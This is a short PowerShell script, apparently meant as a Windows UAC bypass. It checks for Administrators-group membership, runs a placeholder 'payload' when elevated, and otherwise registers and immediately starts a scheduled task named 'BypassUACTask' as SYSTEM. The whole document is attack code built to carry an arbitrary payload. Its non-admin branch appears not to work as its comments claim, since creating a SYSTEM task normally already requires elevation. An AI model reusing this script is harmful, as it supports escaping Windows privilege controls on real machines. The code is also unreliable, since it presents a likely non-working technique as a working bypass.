if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
    # Payload goes here
    # It will run as Administrator
    mkdir C:\Windows\uas-bypass
} else {
    # Create a scheduled task to run as administrator
    $taskAction = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Command {mkdir C:\Windows\uas-bypass}"
    $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(10)  # Run after 10 seconds
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount

    # Correct task settings, removed invalid parameter
    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries $true

    # Register the scheduled task
    Register-ScheduledTask -Action $taskAction -Principal $taskPrincipal -Trigger $taskTrigger -Settings $taskSettings -TaskName "BypassUACTask"

    # Run the task immediately
    schtasks /run /tn "BypassUACTask"
}
